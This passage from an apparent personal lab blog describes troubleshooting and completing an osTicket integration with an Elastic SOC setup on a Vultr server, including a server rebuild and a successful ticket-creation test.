However, I ran into more problems here and lost connection to my osTicket server and could not restablish my RDP session. So, I navigated to Vultr and used the `View Console` option to work within the osTicket server. I updated the Ethernet 0 2 IP address, subnet mask, and gateway but this did not resolve the issue.
<img width="959" alt="Day25-1k" src="https://github.com/user-attachments/assets/b50ac1b4-d89e-4cec-97de-d1be79ea9909" />

#### More Troubleshooting
After several hours of troubleshooting without success, I took drastic measures. I destroyed my osTicket server and started over from the beginning. I deployed a new server with the same specifications, installed xampp, downloaded and installed osTicket following all of the same steps I took previously.

It can be unsatisfying not being able to discover what issue was preventing the integration from working properly but, this is a learning process and these types of situations are nearly inevitable. On the positive side, starting over got me to where I waanted to go, it just took longer than originally planned.

The screenshots below show the updated Ethernet 0 IP address and the successful `ping` of that IP address meaning that the connectivity issues have been resolved.
<img width="959" alt="Day25a-1" src="https://github.com/user-attachments/assets/e4f71f5f-62ec-4553-b584-d19c7e19d024" />
<img width="959" alt="Day25a-2" src="https://github.com/user-attachments/assets/79df3ea1-24f8-43c8-9311-16daa5e278dc" />

#### Moving On
Under the `Configuration` tab, I changed the `Connector settings` URL to the private IP address of my osTicket server. I saved it and ran the test again. This time with success!
<img width="959" alt="Day25a-3" src="https://github.com/user-attachments/assets/5c3beb32-7962-4609-b014-aa0794edf481" />
<img width="961" alt="Day25a-4" src="https://github.com/user-attachments/assets/9909cede-9c18-426d-9d73-5bb3789db96a" />

To confirm it is working like I expect it is, I navigated to the `Agent Panel` within my osTicket console. Tickets have been generated! It is a relief to get it working after having so much trouble earlier.
<img width="960" alt="Day25a-5" src="https://github.com/user-attachments/assets/c8b800a8-4689-449c-b634-dc0d733dabe5" />

#### Wrapping Up
Now that osTicket is integrated with my Elastic, whenever alerts are generated from Elastic, I can automatically create a ticket in osTicket to start tracking alerts and workflows. This ticketing system satisfies the accounting/auditing A of the AAA security framework. This also provides me with a more robust SOC environment to begin exploring more.

This journey of integrating osTicket with the ELK Stack demonstrates the importance of perseverance and adaptability in troubleshooting complex configurations. While setbacks like connectivity issues can be frustrating, they offer invaluable opportunities to learn and refine problem-solving skills. The successful integration not only streamlines alert tracking and workflow management but also enhances the overall security operations framework. With this foundation, I can now explore more advanced SOC capabilities and continue building a comprehensive and efficient tech stack.
